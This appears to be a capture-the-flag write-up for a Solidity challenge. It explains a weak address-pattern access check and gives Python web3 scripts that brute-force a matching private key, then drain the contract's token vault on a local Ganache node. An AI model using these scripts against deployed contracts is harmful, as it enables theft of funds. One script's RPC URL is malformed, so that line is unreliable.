# Exist

## Introduction
The goal is to trigger ``setflag()``.

This is the source code
```solidity
pragma solidity ^0.6.12;

contract Existing{

	string public name = "Existing";
	string public symbol = "EG";
	uint256 public decimals = 18;
	uint256 public totalSupply = 10000000;
    bool public flag = false;

    mapping(address=>bool)public status;

    event SendFlag(address addr);

    mapping(address => uint) public balanceOf;

    bytes20 internal appearance = bytes20(bytes32("ZT"))>>144;
    bytes20 internal maskcode = bytes20(uint160(0xffff));

    constructor()public{ 
        balanceOf[address(this)] += totalSupply;
    }

    function transfer(address to,uint amount) external {
        _transfer(msg.sender,to,amount);
    }

    function _transfer(address from,address to,uint amount) internal {
        require(balanceOf[from] >= amount,"amount exceed");
        require(to != address(0),"you cant burn my token");
        require(balanceOf[to]+amount >= balanceOf[to]);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }

    modifier only_family{
        require(is_my_family(msg.sender),
        "no no no,my family only");
        _;
    }

    modifier only_EOA(address msgs){
        uint x;
        assembly { 
            x := extcodesize(msgs) 
            }
        require(x == 0,"Only EOA can do that");
        _;
    } 

    function is_my_family(address account) internal returns (bool) {
        bytes20 you = bytes20(account);

        bytes20 code = maskcode;
        bytes20 feature = appearance;

        for (uint256 i = 0; i < 34; i++) {
            if (you & code == feature) {
                return true;
            }

            code <<= 4;
            feature <<= 4;
        }
        return false;
    }

    function share_my_vault() external only_EOA(msg.sender) only_family {
        uint256 add = balanceOf[address(this)];
        _transfer(address(this),msg.sender,add);
    }

    function setflag() external{
        if(balanceOf[msg.sender] >= totalSupply) {
            flag = true;
        }
    }
    function isSolved() external view returns(bool) {
        
        return flag;
    }
}
```

## Environment
These are the IDEs and langauges used to set up the environment.
- Remix IDE
- VScode
- Python3 
- Ganache-cli

## Setup
Here's a quick setup 
1) Download ganache-cli with ``yarn global add ganache``
2) Run ganache-cli with ``ganache-cli``
3) Go to remix IDE -> Deploy & Run transaction -> Environment -> Choose 'Dev - Ganache Provider'
4) Create a solidity file -> copy and paste the smart contract 
5) Compile and deploy
6) Start messing around

## Code Breakdown

**is_my_family(address account)**

This is the key function that we should be looking at.

```solidity
function is_my_family(address account) internal returns (bool) {
    bytes20 you = bytes20(account);

    bytes20 code = maskcode;
    bytes20 feature = appearance;

    for (uint256 i = 0; i < 34; i++) {
        if (you & code == feature) {
            return true;
        }

        code <<= 4;
        feature <<= 4;
    }
    return false;
}
```
Firstly we have to look at ``you``, ``code`` and ``feature``.

These variables are used to bitwise
```solidity
if (you & code == feature)
```

Both ``code`` and ``feature`` from ``appearance`` and ``maskcode``
```solidity
bytes20 internal appearance = bytes20(bytes32("ZT"))>>144;
bytes20 internal maskcode = bytes20(uint160(0xffff));
```
Here's the derived formulae:

``feature`` = ``appearance`` = 0x0000000000000000000000000000000000005a54

``code`` = ``maskcode`` = 0x000000000000000000000000000000000000ffff

``you`` & '0x000000000000000000000000000000000000ffff' == '0x0000000000000000000000000000000000005a54'

**share_my_vault()**

We want to access their EG tokens by calling this function. However, you can only call this function if you are part of the family

**setflag()**

Set the flag to true


## Hints
Here is the breakdown:

1) We need to create an address in ``you`` to complete this equation.

    ``you`` & '0x000000000000000000000000000000000000ffff' == '0x0000000000000000000000000000000000005a54'

    To do that, we'll need to create a script to brute force ``you``.
2) Once we have that address, we'll call ``share_my_vault()`` and ``setflag()``

## Solutions
The solution will be broken down into 2 parts - bruteforcing and execution.

### Bruteforcing

We'll a section of the smart contract code and create a script to complete the equation. Using the script below, we will find the private key (in hexadecimal) to be used in the execution phase.

```python
from web3 import Web3
from Crypto.Util.number import *
w3 = Web3(Web3.HTTPProvider("http://127.0.0.1/8545"))

def check(addr):
    addr = int(addr, 16)
    code = 0xffff
    feature = bytes_to_long(b"ZT")

    for i in range(34):
        # Return true if equation is complete
        if addr & code == feature :
            return True

        # Shift left bit by 4 positions
        code <<= 4
        feature <<= 4

    #Return false if equation not complete
    return False

for i in range(0xffff):
    #Generates a hexadecimal string representing the integer i, padded with zeros to a length of 66 characters
    pk = hex(i).ljust(66, "0") #E.g 0x1000000000000000000000000000000000000000000000000000000000000000
    
    #Create an address with that private key
    addr=w3.eth.account.from_key(pk).address

    #Check if equation is complete
    if check(addr):
        print(f'Result: {i}') #Result: 289
        break
```

### Execution
Using hexadecimal (289), we can begin our execution. This is the script used to execute the attack.
```python
import json
from web3 import Web3
w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

#Check Connection
if w3.is_connected():
    print('Connected to Ethereum network')
else:
    print('Not connected to Ethereum network')

# Get private key 
prikey = hex(289).ljust(66, "0")

# Create a signer wallet
PA=w3.eth.account.from_key(prikey)
Public_Address=PA.address

print(Public_Address) # 0x601365F0Da65A54333FBA2bc93924aADaA338539

myAddr = Public_Address
cont = "0xF6dB74c7e4074658dd5A7A7cc3060f21752E9794" #Deployed contract's address

def send_ether(_from, _to, _prikey, amount):
    signed_txn = w3.eth.account.sign_transaction (dict(
        nonce=w3.eth.get_transaction_count(_from),
        gasPrice = w3.eth.gas_price, 
        gas = 21000,
        to=_to,
        value = amount,
        chainId = w3.eth.chain_id,
        ),
        _prikey
    )
    result = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)
    print(transaction_receipt)

def share_my_vault():
    f = open('cont.abi', 'r')
    abi_txt = f.read()
    abi = json.loads(abi_txt)
    contract = w3.eth.contract(address=cont, abi=abi)
    func_call = contract.functions.share_my_vault().build_transaction({
        "from": myAddr,
        "nonce": w3.eth.get_transaction_count(myAddr),
        "gasPrice": w3.eth.gas_price,
        "value": 0,
        "chainId": w3.eth.chain_id,
    })
    signed_tx = w3.eth.account.sign_transaction(func_call, prikey)
    result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)
    print(transaction_receipt)

def setflag():
    f = open('cont.abi', 'r')
    abi_txt = f.read()
    abi = json.loads(abi_txt)
    contract = w3.eth.contract(address=cont, abi=abi)
    func_call = contract.functions.setflag().build_transaction({
        "from": myAddr,
        "nonce": w3.eth.get_transaction_count(myAddr),
        "gasPrice": w3.eth.gas_price,
        "value": 0,
        "chainId": w3.eth.chain_id,
    })
    signed_tx = w3.eth.account.sign_transaction(func_call, prikey)
    result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)
    print(transaction_receipt)

def isSolved():
    f = open('cont.abi', 'r')
    abi_txt = f.read()
    abi = json.loads(abi_txt)
    contract = w3.eth.contract(address=cont, abi=abi)
    result = contract.functions.isSolved().call()
    print(result)

#Send ether to your newly created address 
#Parameters inputed (_from, _to, _from_privatekey, amount)
send_ether("0x000aC03fa5C30668646f153F8048008C505BF971", myAddr, '0xa0c36f2b02f7a49af4abb4f5054c0f9626678500054da8e22cbca044e72ec864', w3.to_wei("1", "ether"))

#Share EG tokens with the newly created address
share_my_vault()

#Set flag
setflag()

#Check if flag is set to true
isSolved() #True
```

## Reference
Scripts were from [gss1](https://gss1.tistory.com/entry/NumemCTF-2022#toc6) write-up. I've only research, analyse and study the breakdown.